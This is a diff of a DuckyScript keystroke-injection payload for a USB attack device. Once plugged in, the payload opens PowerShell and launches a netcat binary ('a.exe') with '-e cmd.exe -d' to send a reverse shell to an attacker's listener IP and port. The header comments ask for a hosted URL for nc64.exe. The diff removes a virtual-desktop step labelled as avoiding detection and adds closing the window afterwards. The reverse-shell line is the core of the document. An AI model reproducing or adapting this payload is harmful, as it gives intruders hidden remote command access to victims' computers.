@@ -5,12 +5,7 @@ REM <HOSTED URL> - URL to where nc64.exe is hosted
 REM <IP_ADDR> - Change the IP to your listener IP
 REM <PORT>  - Port of listener
 
-DEFAULTDELAY 10
-
-REM Create and set new virtual desktop
-GUI CTRL d
-GUI CTRL RIGHTARROW
-DELAY 300
+DEFAULTDELAY 100
 
 REM Open Powershell
 GUI r
@@ -31,5 +26,6 @@ REM Connect to listener
 STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
 ENTER
 
-REM Return to Orginal desktop to avoid detection
-GUI CTRL LEFTARROW
+REM Exit Powershell
+ALT F4
+
